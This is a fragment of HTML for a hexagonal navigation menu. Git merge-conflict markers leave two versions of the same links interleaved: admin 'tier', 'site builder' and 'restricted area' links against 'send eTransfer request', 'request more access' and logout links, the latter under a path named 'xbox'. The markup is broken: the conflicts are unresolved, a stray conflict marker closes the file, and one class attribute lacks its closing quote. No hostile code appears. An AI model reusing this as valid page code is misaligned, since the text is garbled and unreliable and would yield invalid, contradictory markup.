                                        </div>
                                        <div class="hex-item">
                                            <div></div>
                                            <div></div>
                                            <div></div>
                                        </div>
<<<<<<<< HEAD:.www/admin/Main.php
                                        <a href="../.=/tiertwo/index.php" class="hex-content">
========
                                        <a href="send.php" class="hex-content">
>>>>>>>> 5cf96fe71510912bc4974ef3763b94e3d4c3229f:.pages/xbox/.=/tierone/index.php
                                            <span class="hex-content-inner">
                                                <span class="icon">
                                                    <i class="fa fa-braille"></i>
                                                </span>
<<<<<<<< HEAD:.www/admin/Main.php
                                                <span class="title">TIER TWO</span>
========
                                                <span class="title">SEND ETRANSFER REQUEST</span>
>>>>>>>> 5cf96fe71510912bc4974ef3763b94e3d4c3229f:.pages/xbox/.=/tierone/index.php
                                            </span>
                                            <svg viewBox="0 0 173.20508075688772 200" height="200" width="174" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M86.60254037844386 0L173.20508075688772 50L173.20508075688772 150L86.60254037844386 200L0 150L0 50Z" fill="#1e2530"></path></svg>
                                        </a>    
                                    </div>
                                    <div class="hexagon-item">
                                        <div class="hex-item">
                                            <div></div>
                                            <div></div>
                                            <div></div>
                                        </div>
                                        <div class="hex-item">
                                            <div></div>
                                            <div></div>
                                            <div></div>
                                        </div>
<<<<<<<< HEAD:.www/admin/Main.php
                                        <a href="../.=/tierthree/index.php" class="hex-content">
========
                                        <a href="access.php" class="hex-content">
>>>>>>>> 5cf96fe71510912bc4974ef3763b94e3d4c3229f:.pages/xbox/.=/tierone/index.php
                                            <span class="hex-content-inner">
                                                <span class="icon">
                                                    <i class="fa fa-id-badge"></i>
                                                </span>
<<<<<<<< HEAD:.www/admin/Main.php
                                                <span class="title">TIER THREE</span>
========
                                                <span class="title>REQUEST MORE ACCESS</span>
>>>>>>>> 5cf96fe71510912bc4974ef3763b94e3d4c3229f:.pages/xbox/.=/tierone/index.php
                                            </span>
                                            <svg viewBox="0 0 173.20508075688772 200" height="200" width="174" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M86.60254037844386 0L173.20508075688772 50L173.20508075688772 150L86.60254037844386 200L0 150L0 50Z" fill="#1e2530"></path></svg>
                                        </a>
                                    </div>
                                    <div class="hexagon-item">
                                        <div class="hex-item">
                                            <div></div>
                                            <div></div>
                                            <div></div>
                                        </div>
                                        <div class="hex-item">
                                            <div></div>
                                            <div></div>
                                            <div></div>
                                        </div>
<<<<<<<< HEAD:.www/admin/Main.php
                                        <a href="../.=/tierfour/index.php" class="hex-content">
========
                                        <a href="idea.php" class="hex-content">
>>>>>>>> 5cf96fe71510912bc4974ef3763b94e3d4c3229f:.pages/xbox/.=/tierone/index.php
                                            <span class="hex-content-inner">
                                                <span class="icon">
                                                    <i class="fa fa-life-ring"></i>
                                                </span>
<<<<<<<< HEAD:.www/admin/Main.php
                                                <span class="title">TIER FOUR</span>
========
                                                <span class="title">GOT AN IDEA?</span>
>>>>>>>> 5cf96fe71510912bc4974ef3763b94e3d4c3229f:.pages/xbox/.=/tierone/index.php
                                            </span>
                                            <svg viewBox="0 0 173.20508075688772 200" height="200" width="174" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M86.60254037844386 0L173.20508075688772 50L173.20508075688772 150L86.60254037844386 200L0 150L0 50Z" fill="#1e2530"></path></svg>
                                        </a>
                                    </div>
                                    <div class="hexagon-item">
                                        <div class="hex-item">
                                            <div></div>
                                            <div></div>
                                            <div></div>
                                        </div>
                                        <div class="hex-item">
                                            <div></div>
                                            <div></div>
                                            <div></div>
                                        </div>
<<<<<<<< HEAD:.www/admin/Main.php
                                        <a href="../.=/builder/index.php" class="hex-content">
========
                                        <a href="contact.php" class="hex-content">
>>>>>>>> 5cf96fe71510912bc4974ef3763b94e3d4c3229f:.pages/xbox/.=/tierone/index.php
                                            <span class="hex-content-inner">
                                                <span class="icon">
                                                    <i class="fa fa-clipboard"></i>
                                                </span>
<<<<<<<< HEAD:.www/admin/Main.php
                                                <span class="title">SITE BUILDER</span>
========
                                                <span class="title">CONTACT INFORMATION</span>
>>>>>>>> 5cf96fe71510912bc4974ef3763b94e3d4c3229f:.pages/xbox/.=/tierone/index.php
                                            </span>
                                            <svg viewBox="0 0 173.20508075688772 200" height="200" width="174" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M86.60254037844386 0L173.20508075688772 50L173.20508075688772 150L86.60254037844386 200L0 150L0 50Z" fill="#1e2530"></path></svg>
                                        </a>
                                    </div>
                                    <div class="hexagon-item">
                                        <div class="hex-item">
                                            <div></div>
                                            <div></div>
                                            <div></div>
                                        </div>
                                        <div class="hex-item">
                                            <div></div>
                                            <div></div>
                                            <div></div>
                                        </div>
<<<<<<<< HEAD:.www/admin/Main.php
                                        <a href="../.=/restricted_area/index.php" class="hex-content">
========
                                        <a href="logout.php" class="hex-content">
>>>>>>>> 5cf96fe71510912bc4974ef3763b94e3d4c3229f:.pages/xbox/.=/tierone/index.php
                                            <span class="hex-content-inner">
                                                <span class="icon">
                                                    <i class="fa fa-map-signs"></i>
                                                </span>
<<<<<<<< HEAD:.www/admin/Main.php
                                                <span class="title">RESTRICTED AREA</span>
========
                                                <span class="title">LOG-OUT</span>
>>>>>>>> 5cf96fe71510912bc4974ef3763b94e3d4c3229f:.pages/xbox/.=/tierone/index.php
                                            </span>
                                            <svg viewBox="0 0 173.20508075688772 200" height="200" width="174" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M86.60254037844386 0L173.20508075688772 50L173.20508075688772 150L86.60254037844386 200L0 150L0 50Z" fill="#1e2530"></path></svg>
                                        </a>
                                    </div>
                                </div>
                            </div></div>
                </div></div></div></main>
</body></html>
>>>>>>> 5cf96fe71510912bc4974ef3763b94e3d4c3229f
